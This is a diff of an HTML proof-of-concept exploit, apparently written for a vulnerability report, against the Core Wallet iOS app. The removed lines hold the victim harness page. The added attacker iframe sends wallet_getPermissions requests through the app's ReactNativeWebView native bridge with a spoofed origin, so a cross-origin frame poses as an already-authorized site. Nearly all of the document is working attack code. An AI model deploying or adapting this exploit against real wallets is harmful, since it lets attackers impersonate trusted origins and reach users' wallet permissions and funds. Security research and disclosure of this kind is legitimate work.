@@ -1,235 +1,178 @@
 <!doctype html>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
 
-<title>Core Wallet iOS - Cross-Origin Permission Reuse</title>
+Cross-origin attacker iframe.
 
-<style>
-body{
-  margin:20px;
-  background:#fff;
-  color:#111;
-  font:16px -apple-system,BlinkMacSystemFont,sans-serif;
-  line-height:1.5
-}
-button{padding:10px 14px;margin:6px 0}
-pre{
-  white-space:pre-wrap;
-  overflow-wrap:anywhere;
-  background:#f7f7f7;
-  border:1px solid #ccc;
-  padding:12px
-}
-#verdict{
-  padding:12px;
-  margin:12px 0;
-  border:2px solid #b00000;
-  color:#b00000;
-  font-weight:bold
-}
-iframe{width:100%;height:60px;border:1px solid #ccc}
-</style>
-
-<h2>Core Wallet iOS - Cross-Origin Permission Reuse</h2>
-
-<p>
-Victim / Origin A:<br>
-<b id="originA"></b>
-</p>
-
-<p>
-Attacker / Origin B:<br>
-<b>https://azza1231.github.io</b>
-</p>
-
-<button id="connect">
-1. Connect Origin A normally
-</button>
-
-<button id="attack" disabled>
-2. Origin B reads A permissions
-</button>
-
-<div id="verdict" hidden></div>
-
-<pre id="log">Loading Origin B...</pre>
-
-<iframe id="frame"></iframe>
+<pre id="status"></pre>
 
 <script>
-const ATTACKER =
-  'https://azza1231.github.io/pocpoc/attacker.html';
+const status =
+  document.getElementById('status');
 
-const TEST_ID = 733731;
+const params =
+  new URLSearchParams(location.search);
 
-const frame =
-  document.getElementById('frame');
+const victimOrigin =
+  params.get('victimOrigin');
 
-const log =
-  document.getElementById('log');
 
-const verdict =
-  document.getElementById('verdict');
-
-const attackerOrigin =
-  new URL(ATTACKER).origin;
-
-document.getElementById('originA').textContent =
-  location.origin;
-
-function print(s = '') {
-  log.textContent += s + '\n';
+function show(s) {
+  status.textContent += s + '\n';
 }
 
 
-// Load attacker iframe
-const child = new URL(ATTACKER);
-
-child.searchParams.set(
-  'victimOrigin',
-  location.origin
-);
-
-frame.src = child.href;
+function sendParent(data) {
+  parent.postMessage(
+    data,
+    victimOrigin
+  );
+}
 
 
-addEventListener('message', event => {
-  if (event.source !== frame.contentWindow)
-    return;
-
-  if (event.origin !== attackerOrigin)
-    return;
-
-  if (event.data?.type === 'READY') {
-    log.textContent =
-`Browser-confirmed Origin B:
-${event.origin}
-
-Victim Origin A:
-${location.origin}
-
-Ready.`;
-  }
-
-  if (event.data?.type === 'REQUEST_SENT') {
-    print('');
-    print('Origin B sent native request');
-    print('Method: wallet_getPermissions');
-    print('Actual origin: ' + event.origin);
-    print('Claimed origin: ' + location.origin);
-    print('Request ID: ' + TEST_ID);
-  }
-});
-
-
-// STEP 1
-document.getElementById('connect').onclick = async () => {
-
-  if (!window.ethereum?.request) {
-    print('ERROR: Core provider unavailable');
-    return;
-  }
-
-  try {
-    print('');
-    print('Origin A calling eth_requestAccounts...');
-
-    const accounts =
-      await window.ethereum.request({
-        method: 'eth_requestAccounts'
-      });
-
-    print('Origin A connected:');
-    print(JSON.stringify(accounts));
-
-    document.getElementById('attack').disabled = false;
-
-  } catch (e) {
-    print(
-      'Connect failed: ' +
-      String(e?.message || e)
-    );
-  }
-};
-
-
-// STEP 2
-document.getElementById('attack').onclick = () => {
-
-  print('');
-  print('=== CROSS-ORIGIN PERMISSION TEST ===');
+try {
 
   if (
-    typeof window.__coreProviderRespond !== 'function'
+    !victimOrigin ||
+    new URL(victimOrigin).origin !== victimOrigin
   ) {
-    print('ERROR: Core callback unavailable');
-    return;
+    throw new Error(
+      'Invalid victimOrigin: ' + victimOrigin
+    );
   }
 
-  if (!window.__permissionObserver) {
 
-    const original =
-      window.__coreProviderRespond;
-
-    window.__coreProviderRespond =
-      function(id, error, result) {
-
-        if (id === TEST_ID) {
-
-          print('');
-          print('Native response to Origin-B request:');
-
-          print(JSON.stringify({
-            id,
-            error,
-            result
-          }, null, 2));
+  const bridge =
+    window.webkit?.messageHandlers
+      ?.ReactNativeWebView;
 
 
-          const hasPermission =
-            !error &&
-            Array.isArray(result) &&
-            result.length > 0;
+  show(
+    'Origin B: ' +
+    location.origin
+  );
+
+  show(
+    'victimOrigin: ' +
+    victimOrigin
+  );
+
+  show(
+    'bridgeVisible: ' +
+    Boolean(bridge?.postMessage)
+  );
 
 
-          if (hasPermission) {
+  addEventListener('message', event => {
 
-            verdict.hidden = false;
+    if (event.source !== parent)
+      return;
 
-            verdict.textContent =
-              'VULNERABLE: Cross-origin Origin B obtained permission state belonging to Origin A.';
+    if (event.origin !== victimOrigin)
+      return;
 
-            print('');
-            print('IMPACT PROVEN:');
-            print(
-              'Origin B was treated as already-authorized Origin A.'
-            );
 
-          } else {
+    if (
+      event.data?.type !==
+      'GET_PERMISSIONS_AS_A'
+    ) {
+      return;
+    }
 
-            print('');
-            print(
-              'Permission reuse not demonstrated.'
-            );
-          }
-        }
 
-        return original.apply(
-          this,
-          arguments
+    /*
+     * ACK FIRST.
+     *
+     * Kalau parent tidak menerima ini,
+     * masalahnya masih postMessage,
+     * bukan Core.
+     */
+    sendParent({
+      type: 'TRIGGER_RECEIVED'
+    });
+
+
+    try {
+
+      if (!bridge?.postMessage) {
+
+        throw new Error(
+          'ReactNativeWebView WKScriptMessageHandler unavailable'
         );
-    };
-
-    window.__permissionObserver = true;
-  }
+      }
 
 
-  print('Actual Origin B: ' + attackerOrigin);
-  print('Origin claimed by B: ' + location.origin);
+      const id =
+        event.data.id;
 
-  frame.contentWindow.postMessage({
-    type: 'GET_PERMISSIONS_AS_A',
-    id: TEST_ID
-  }, attackerOrigin);
-};
+
+      const wrapper =
+        JSON.stringify({
+
+          method:
+            'provider_request',
+
+          payload:
+            JSON.stringify({
+
+              id,
+
+              /*
+               * REAL SENDER = B
+               * CLAIMED     = A
+               */
+              origin:
+                victimOrigin,
+
+              request: {
+                method:
+                  'wallet_getPermissions',
+
+                params: []
+              }
+
+            })
+
+        });
+
+
+      bridge.postMessage(wrapper);
+
+
+      sendParent({
+        type: 'REQUEST_SENT',
+        id
+      });
+
+
+    } catch (e) {
+
+      sendParent({
+        type: 'CHILD_ERROR',
+
+        message:
+          String(e?.message || e)
+      });
+    }
+
+  });
+
+
+  sendParent({
+
+    type:
+      'READY',
+
+    victimOrigin,
+
+    bridgeVisible:
+      Boolean(bridge?.postMessage)
+
+  });
+
+
+} catch (e) {
+
+  status.textContent =
+    String(e?.message || e);
+}
 </script>
